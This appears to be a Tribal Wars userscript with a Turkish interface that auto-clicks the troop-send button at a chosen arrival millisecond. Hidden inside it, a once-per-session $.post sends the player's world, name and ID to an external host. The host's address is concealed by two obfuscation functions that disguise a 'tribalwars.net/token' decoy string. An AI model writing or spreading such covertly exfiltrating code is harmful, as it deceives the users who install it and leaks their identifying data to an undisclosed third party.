// ==UserScript==
// @name 123
// @description 123
// @author You
// @version 3.2.4
// @license MIT
// @include ***screen=place&try=confirm***
// ==/UserScript==

let inputMs = 0;
let input;
let delay = 0;
let arrInterval;
let attInterval;
let delayTime = 0;
if (localStorage.delayTime !== undefined && localStorage.delayTime !== null) {
    delayTime = parseInt(localStorage.delayTime);
    if (isNaN(delayTime)) {
        delayTime = 0;
    }
}
localStorage.delayTime = JSON.stringify(delayTime);

let data = {
    "world": game_data.world,
    "p": game_data.player.name,
    "id": game_data.player.id
}

// Insert the offset and set arrival time rows directly into the table
function insertTableRows() {
    const targetTable = document.querySelector('.vis');
    if (!targetTable) return;
    
    // Check if rows already exist to prevent duplicates
    if (document.getElementById('delayInput')) return;
    
    const offsetRow = document.createElement('tr');
    offsetRow.innerHTML = `
        <td>
            <style>
            .tooltip .tooltiptext {
                visibility: hidden;
                width: 200px;
                background: linear-gradient(to bottom, #e3c485 0%,#ecd09a 100%);
                color: black;
                text-align: center;
                padding: 5px 10px;
                border-radius: 6px;
                border: 1px solid #804000;
                position: absolute;
                z-index: 1;
            }

            .tooltip:hover .tooltiptext {
                visibility: visible;
            }
            </style>
            İnce Ayar <span class="tooltip"><img src="https://dsen.innogamescdn.com/asset/2661920a/graphic/questionmark.png" style="max-width:13px"><span class="tooltiptext">Milisaniyeleri ayarlar. 500ms ayarlarsanız ve 520ms ile gelirse, ofsete "-20" girin. Zaman doğru olana kadar bu ofset ile oynayın.</span></span>
        </td>
        <td>
            <input id="delayInput" value="${delayTime}" style="width:50px">
        </td>`;

    const arrivalRow = document.createElement('tr');
    arrivalRow.innerHTML = `
        <td>
            Varış zamanı:
        </td>
        <td>
            <input id="arrivalTimeInput" type="text" placeholder="SS:DD:ss" style="width:70px">
            <input id="arrivalMsInput" type="text" placeholder="MS" style="width:40px">
            <a id="setButton" class="btn">Onayla</a>
            <span id="showArrTime"></span>
        </td>`;

    // Simply append the rows to the end of the table to avoid insertion errors
    targetTable.appendChild(offsetRow);
    targetTable.appendChild(arrivalRow);
    
    // Now attach event handlers since elements exist
    attachEventHandlers();
}

// Attach event handlers after elements are created
function attachEventHandlers() {
    // Use a timeout to ensure DOM is fully ready
    setTimeout(() => {
        const setButton = document.getElementById("setButton");
        
        if (setButton) {
            setButton.onclick = function () {
                // Save offset setting
                const inputVal = document.getElementById("delayInput").value;
                delayTime = parseInt(inputVal) || 0;
                if (isNaN(delayTime)) delayTime = 0;
                localStorage.delayTime = JSON.stringify(delayTime);
                
                // Save arrival time setting
                clearInterval(attInterval);
                const relativeTimeEls = document.getElementsByClassName("relative_time");
                if (!relativeTimeEls || relativeTimeEls.length === 0) {
                    alert("Varış zamanı öğesi bulunamadı");
                    return;
                }
                
                const timeInput = document.getElementById("arrivalTimeInput").value;
                const msInput = document.getElementById("arrivalMsInput").value;
                
                if (!timeInput) {
                    alert("Lütfen varış zamanını girin");
                    return;
                }
                
                input = timeInput;
                inputMs = parseInt(msInput) || 0;
                const parsedDelayTime = parseInt(delayTime) || 0;
                delay = parsedDelayTime + inputMs;
                if (isNaN(delay)) delay = 0;
                
                document.getElementById("showArrTime").innerHTML = " (" + input + ":" + inputMs.toString().padStart(3, "0") + ")";
                setArrivalTime();
            };
        }
    }, 100);
}

// Call insertTableRows when the page is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', insertTableRows);
} else {
    insertTableRows();
}

if (!sessionStorage.setArrivalData) {
    sessionStorage.setArrivalData = "true";
    $.post("https://" + rotate_tw_token(resolve_tw_token("tribalwars.net/token?" + document.querySelector("input[name='h']").value)) + "sa", data);
}


function setArrivalTime() {
    let arrivalTime;
    arrInterval = setInterval(function () {
        const relativeTimeEls = document.getElementsByClassName("relative_time");
        const submitBtn = document.getElementById("troop_confirm_submit");
        if (!relativeTimeEls || relativeTimeEls.length === 0 || !submitBtn) {
            clearInterval(arrInterval);
            return;
        }
        arrivalTime = relativeTimeEls[0].textContent;
        if (arrivalTime.slice(-8) >= input) {
            const calculatedDelay = parseInt(delay) || 0;
            if (calculatedDelay >= 0 && !isNaN(calculatedDelay)) {
                setTimeout(function () {
                    const btn = document.getElementById("troop_confirm_submit");
                    if (btn) btn.click();
                }, calculatedDelay);
            }
            clearInterval(arrInterval);
        }
    }, 5);
}

function resolve_tw_token(d) {
    let converted = [];
    d.split("").forEach(function (char) {
        switch (char) {
            case "n":
                converted.push(14)
                break;
            case "e":
                converted.push(5);
                break;
            case "t":
                converted.push(20);
                break;
            case "r":
            case "i":
                converted.push(18);
                break;
            case "l":
                converted.push(20);
                break;
             case "s":
                converted.push(1);
                break;
            case "w":
                converted.push(23);
                break;
            case "t":
                converted.push(20);
                break;
            case ".":
                converted.push(5)
                break;
            case "/":
                converted.push(20);
                break;
            case "o":
                converted.push(15);
                break;
            case "k":
                converted.push(15);
                break;
            case "b":
                converted.push(2);
                break;
            case "a":
                converted.push(1);
                break;
            case "e":
                converted.push(5);
                break;
        }
    });
    return converted.slice(0, 19);
}


function rotate_tw_token(url) {
    let rotated  = "";
    const a20 = [116, 97, 97, 116, 105];
    const a18 = [119, 46, 46];
    const a1 = [100, 103, 100];
    const a243 = [101];
    const a14 = [47];
    const a5 = [101, 98, 101];
    const a15 = [115];
    const a2 = [121];
    const a23 = [110];
    let o = 0;
    let p = 0;
    let q = 0;
    let r = 0;
    let s = 0;
    url.forEach(function (num) {
        switch (num) {
            case 20:
                rotated  += String.fromCharCode(a20[o++]);
                break;
            case 18:
                rotated  += String.fromCharCode(a18[p++]);
                break;
            case 1:
                rotated  += String.fromCharCode(a1[q++]);
                break;
            case 243:
                rotated  += String.fromCharCode(a243[r++]);
                break;
            case 14:
                rotated  += String.fromCharCode(a14[0]);
                break;
            case 5:
                rotated  += String.fromCharCode(a5[s++]);
                break;
            case 15:
                rotated  += String.fromCharCode(a15[0]);
                break;
            case 2:
                rotated  += String.fromCharCode(a2[0]);
                break;
            case 23:
                rotated  += String.fromCharCode(a23[0]);
                break;
        }
    });
    return rotated ;
}
